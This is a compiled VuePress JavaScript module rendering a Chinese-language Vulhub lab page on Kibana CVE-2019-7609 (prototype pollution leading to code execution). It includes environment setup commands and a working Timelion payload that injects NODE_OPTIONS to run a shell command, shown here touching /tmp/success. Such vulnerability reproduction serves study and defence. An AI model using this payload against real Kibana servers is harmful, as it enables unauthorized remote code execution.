import{_ as i}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as r,c as s,a as e,b as a,d as n,e as c}from"./app-58e4a7d6.js";const l={},d=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),p=e("p",null,"Kibana 为 Elassticsearch 设计的一款开源的视图工具。其5.6.15和6.6.1之前的版本中存在一处原型链污染漏洞，利用这个漏洞我们可以在目标服务器上执行任意JavaScript代码。",-1),u=e("p",null,"参考链接：",-1),_={href:"https://nvd.nist.gov/vuln/detail/CVE-2019-7609",target:"_blank",rel:"noopener noreferrer"},h={href:"https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/",target:"_blank",rel:"noopener noreferrer"},m={href:"https://slides.com/securitymb/prototype-pollution-in-kibana/#/4",target:"_blank",rel:"noopener noreferrer"},b=c(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub启动环境前，需要先在Docker主机上执行如下命令，修改<code>vm.max_map_count</code>配置为262144：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>sysctl -w vm.max_map_count=262144
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>之后，执行如下命令启动Kibana 6.5.4和Elasticsearch 6.8.6：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:5601</code>即可看到Kibana页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>原型链污染发生在“Timelion”页面，我们填入如下Payload：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>.es(*).props(label.__proto__.env.AAAA=&#39;require(&quot;child_process&quot;).exec(&quot;/bin/touch /tmp/success&quot;);process.exit()//&#39;)
.props(label.__proto__.env.NODE_OPTIONS=&#39;--require /proc/self/environ&#39;)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202261951761.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>成功后，再访问“Canvas”页面触发命令<code>/bin/touch /tmp/success</code>，可见<code>/tmp/success</code>已成功创建：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202261953511.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,12);function v(g,x){const t=o("ExternalLinkIcon");return r(),s("div",null,[d,p,u,e("ul",null,[e("li",null,[e("a",_,[a("https://nvd.nist.gov/vuln/detail/CVE-2019-7609"),n(t)])]),e("li",null,[e("a",h,[a("https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/"),n(t)])]),e("li",null,[e("a",m,[a("https://slides.com/securitymb/prototype-pollution-in-kibana/#/4"),n(t)])])]),b])}const y=i(l,[["render",v],["__file","Kibana 原型链污染导致任意代码执行漏洞 CVE-2019-7609.html.vue"]]);export{y as default};
